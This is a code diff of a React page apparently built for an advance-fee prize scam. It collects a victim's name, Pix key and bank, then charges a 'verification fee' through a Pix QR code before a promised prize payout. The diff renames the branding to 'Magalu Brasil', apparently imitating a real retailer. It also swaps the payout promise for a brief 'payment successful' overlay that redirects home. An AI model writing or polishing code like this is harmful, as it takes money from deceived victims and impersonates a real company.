@@ -1,15 +1,16 @@
-import { createFileRoute } from "@tanstack/react-router";
+import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import { useEffect, useRef, useState } from "react";
 import QRCode from "qrcode";
 import { Copy, Check, ShieldCheck, CheckCircle2 } from "lucide-react";
 import { createPixTransaction, checkPixStatus } from "../lib/pix.functions";
 
+
 export const Route = createFileRoute("/formulario")({
   head: () => ({
     meta: [
-      { title: "Saque do prêmio — Magazine Brasil" },
+      { title: "Saque do prêmio — Magalu Brasil" },
       { name: "description", content: "Preencha seus dados para receber o prêmio." },
-      { property: "og:title", content: "Saque do prêmio Magazine Brasil" },
+      { property: "og:title", content: "Saque do prêmio Magalu Brasil" },
       { property: "og:description", content: "Preencha o formulário para efetuar o saque." },
     ],
   }),
@@ -36,6 +37,7 @@ function onlyLetters(v: string) {
 
 
 function FormularioPage() {
+  const navigate = useNavigate();
   const [nome, setNome] = useState("");
   const [pix, setPix] = useState("");
   const [banco, setBanco] = useState("");
@@ -49,6 +51,7 @@ function FormularioPage() {
   const [externalId, setExternalId] = useState("");
   const [paid, setPaid] = useState(false);
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
+
 
   useEffect(() => {
     const v = sessionStorage.getItem("premio");
@@ -86,6 +89,16 @@ function FormularioPage() {
       if (pollRef.current) clearInterval(pollRef.current);
     };
   }, [externalId, paid]);
+
+  // After payment confirmed, show success animation briefly, then redirect home.
+  useEffect(() => {
+    if (!paid) return;
+    const t = setTimeout(() => {
+      navigate({ to: "/" });
+    }, 3200);
+    return () => clearTimeout(t);
+  }, [paid, navigate]);
+
 
   const canSubmit = nome.trim().length >= 3 && pix.trim().length >= 3 && Boolean(banco);
 
@@ -255,18 +268,22 @@ function FormularioPage() {
 
       {paid && (
         <div
-          id="qr-card"
-          className="mt-6 rounded-md border border-green-500/40 bg-green-50 p-6 text-center animate-in fade-in"
+          role="dialog"
+          aria-live="polite"
+          className="fixed inset-0 z-50 flex items-center justify-center bg-background/80 p-6 backdrop-blur-sm animate-in fade-in"
         >
-          <CheckCircle2 className="mx-auto h-12 w-12 text-green-600" />
-          <h2 className="mt-3 text-xl font-extrabold text-green-700">Pagamento confirmado!</h2>
-          <p className="mt-2 text-sm text-green-800">
-            Recebemos sua taxa de verificação. Seu saque de{" "}
-            <b>R$ {premio.toLocaleString("pt-BR")}</b> será processado em até 7 dias úteis na chave
-            Pix informada.
-          </p>
+          <div className="flex max-w-sm flex-col items-center rounded-2xl border border-green-500/40 bg-white p-8 text-center shadow-xl">
+            <div className="flex h-20 w-20 items-center justify-center rounded-full bg-green-100 animate-in zoom-in duration-500">
+              <CheckCircle2 className="h-14 w-14 text-green-600 animate-in zoom-in duration-700" />
+            </div>
+            <h2 className="mt-4 text-2xl font-extrabold text-green-700 animate-in fade-in slide-in-from-bottom-2 duration-500">
+              Pagamento efetuado com sucesso
+            </h2>
+            <p className="mt-2 text-sm text-muted-foreground">Redirecionando...</p>
+          </div>
         </div>
       )}
+
     </div>
   );
 }
